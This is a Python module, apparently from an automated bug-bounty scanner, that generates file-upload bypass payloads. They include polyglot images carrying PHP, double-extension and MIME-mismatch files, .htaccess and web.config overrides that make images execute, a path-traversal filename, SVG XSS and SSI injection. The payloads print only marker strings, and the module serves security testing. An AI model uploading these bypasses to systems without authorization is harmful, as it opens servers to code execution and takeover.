"""File upload payload generator for testing unrestricted file upload vulnerabilities.

Generates test files with various bypass techniques: extension manipulation,
MIME type mismatch, polyglot files, path traversal filenames, and config overrides.
"""

from __future__ import annotations

import tempfile
from dataclasses import dataclass


@dataclass
class UploadPayload:
    """A file upload test payload."""

    filename: str
    content: bytes
    content_type: str
    description: str
    bypass_type: str  # extension, mime, content, double_ext, null_byte, polyglot, config, case


# Valid JPEG header (minimal valid JPEG)
_JPEG_HEADER = bytes([
    0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
    0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
])

# Valid PNG header (first 8 bytes)
_PNG_HEADER = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])

# Valid GIF header
_GIF_HEADER = b"GIF89a"


def _all_payloads() -> list[UploadPayload]:
    """Return all possible upload test payloads."""
    php_code = b'<?php echo "AIBBP_UPLOAD_TEST"; ?>'
    asp_code = b'<%= "AIBBP_UPLOAD_TEST" %>'
    jsp_code = b'<%= "AIBBP_UPLOAD_TEST" %>'
    aspx_code = b'<%@ Page Language="C#" %><%Response.Write("AIBBP_UPLOAD_TEST");%>'

    return [
        # -- PHP payloads --
        UploadPayload(
            filename="test_upload.php",
            content=php_code,
            content_type="application/x-php",
            description="Direct PHP upload — tests if .php extension is allowed",
            bypass_type="extension",
        ),
        UploadPayload(
            filename="test_upload.php.jpg",
            content=php_code,
            content_type="image/jpeg",
            description="Double extension bypass — .php.jpg with image MIME",
            bypass_type="double_ext",
        ),
        UploadPayload(
            filename="test_upload.phtml",
            content=php_code,
            content_type="application/x-php",
            description="Alternative PHP extension (.phtml)",
            bypass_type="extension",
        ),
        UploadPayload(
            filename="test_upload.pHp",
            content=php_code,
            content_type="application/x-php",
            description="Case variation bypass (.pHp)",
            bypass_type="case",
        ),
        UploadPayload(
            filename="test_upload.php5",
            content=php_code,
            content_type="application/x-php",
            description="PHP5 extension bypass (.php5)",
            bypass_type="extension",
        ),
        UploadPayload(
            filename="test_upload.php",
            content=php_code,
            content_type="image/jpeg",
            description="MIME type mismatch — .php with image/jpeg Content-Type",
            bypass_type="mime",
        ),
        UploadPayload(
            filename="test_upload.php",
            content=php_code,
            content_type="image/png",
            description="MIME type mismatch — .php with image/png Content-Type",
            bypass_type="mime",
        ),

        # -- Polyglot payloads --
        UploadPayload(
            filename="polyglot.php.jpg",
            content=_JPEG_HEADER + b"\n" + php_code,
            content_type="image/jpeg",
            description="JPEG/PHP polyglot — valid JPEG header with PHP code appended",
            bypass_type="polyglot",
        ),
        UploadPayload(
            filename="polyglot.php.png",
            content=_PNG_HEADER + b"\n" + php_code,
            content_type="image/png",
            description="PNG/PHP polyglot — valid PNG header with PHP code appended",
            bypass_type="polyglot",
        ),
        UploadPayload(
            filename="polyglot.php.gif",
            content=_GIF_HEADER + b"\n" + php_code,
            content_type="image/gif",
            description="GIF/PHP polyglot — valid GIF header with PHP code appended",
            bypass_type="polyglot",
        ),

        # -- ASP/ASPX/JSP payloads --
        UploadPayload(
            filename="test_upload.asp",
            content=asp_code,
            content_type="application/x-asp",
            description="Classic ASP upload",
            bypass_type="extension",
        ),
        UploadPayload(
            filename="test_upload.aspx",
            content=aspx_code,
            content_type="application/x-aspx",
            description="ASPX web shell upload",
            bypass_type="extension",
        ),
        UploadPayload(
            filename="test_upload.jsp",
            content=jsp_code,
            content_type="application/x-jsp",
            description="JSP upload",
            bypass_type="extension",
        ),

        # -- XSS via file upload --
        UploadPayload(
            filename="xss_test.svg",
            content=b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'AIBBP_XSS_TEST\')"><text>test</text></svg>',
            content_type="image/svg+xml",
            description="SVG with onload XSS — tests if SVGs are served with correct Content-Type",
            bypass_type="content",
        ),
        UploadPayload(
            filename="xss_test.html",
            content=b'<html><body><script>document.title="AIBBP_XSS_TEST"</script></body></html>',
            content_type="text/html",
            description="HTML file with JavaScript — tests if HTML uploads are served",
            bypass_type="content",
        ),

        # -- Config file overrides --
        UploadPayload(
            filename=".htaccess",
            content=b'AddType application/x-httpd-php .jpg\nAddType application/x-httpd-php .png',
            content_type="text/plain",
            description=".htaccess upload — could make JPGs execute as PHP on Apache",
            bypass_type="config",
        ),
        UploadPayload(
            filename="web.config",
            content=b'<?xml version="1.0"?>\n<configuration>\n<system.webServer>\n<handlers>\n'
                    b'<add name="test" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" />\n'
                    b'</handlers>\n</system.webServer>\n</configuration>',
            content_type="text/xml",
            description="web.config upload — could remap handlers on IIS",
            bypass_type="config",
        ),

        # -- Path traversal in filename --
        UploadPayload(
            filename="../../../tmp/aibbp_path_test.txt",
            content=b"AIBBP_PATH_TRAVERSAL_TEST",
            content_type="text/plain",
            description="Path traversal in filename — tests if server sanitizes filenames",
            bypass_type="extension",
        ),

        # -- SSI injection --
        UploadPayload(
            filename="ssi_test.shtml",
            content=b'<!--#echo var="DOCUMENT_ROOT" -->',
            content_type="text/html",
            description="SSI injection via .shtml upload",
            bypass_type="content",
        ),
    ]


def generate_upload_payloads(
    tech_stack: list[str] | None = None,
) -> list[UploadPayload]:
    """Generate file upload payloads, optionally filtered by tech stack.

    Args:
        tech_stack: Detected technologies (e.g., ["PHP", "Apache", "MySQL"]).
            If provided, prioritizes payloads relevant to the stack.

    Returns:
        Ordered list of UploadPayload objects to test.
    """
    all_payloads = _all_payloads()

    if not tech_stack:
        return all_payloads

    tech_lower = [t.lower() for t in tech_stack]
    tech_str = " ".join(tech_lower)

    # Score payloads by relevance to tech stack
    def relevance_score(p: UploadPayload) -> int:
        score = 0
        fn_lower = p.filename.lower()

        # PHP payloads score high for PHP/Apache/Nginx
        if ".php" in fn_lower or "php" in p.description.lower():
            if any(t in tech_str for t in ("php", "apache", "nginx", "lamp", "laravel", "wordpress")):
                score += 10
            else:
                score -= 5

        # ASP/ASPX score high for IIS/.NET
        if ".asp" in fn_lower:
            if any(t in tech_str for t in ("asp", "iis", ".net", "windows")):
                score += 10
            else:
                score -= 5

        # JSP score high for Java/Tomcat
        if ".jsp" in fn_lower:
            if any(t in tech_str for t in ("java", "tomcat", "spring", "jboss")):
                score += 10
            else:
                score -= 5

        # .htaccess only relevant for Apache
        if fn_lower == ".htaccess":
            if "apache" in tech_str:
                score += 10
            else:
                score -= 10

        # web.config only relevant for IIS
        if fn_lower == "web.config":
            if any(t in tech_str for t in ("iis", ".net", "windows")):
                score += 10
            else:
                score -= 10

        # XSS/SVG/HTML payloads are always relevant
        if p.bypass_type == "content":
            score += 5

        # Polyglots and MIME bypasses are always relevant
        if p.bypass_type in ("polyglot", "mime"):
            score += 3

        return score

    scored = sorted(all_payloads, key=relevance_score, reverse=True)
    return scored


def write_payload_to_temp(payload: UploadPayload) -> str:
    """Write a payload to a temporary file and return its path.

    The temp file uses the payload's filename as a suffix hint.
    Caller is responsible for cleanup (files are not auto-deleted).
    """
    # Use the extension from the payload filename
    ext = ""
    if "." in payload.filename:
        ext = "." + payload.filename.rsplit(".", 1)[-1]

    with tempfile.NamedTemporaryFile(
        mode="wb", suffix=ext, delete=False, prefix="aibbp_upload_"
    ) as f:
        f.write(payload.content)
        return f.name
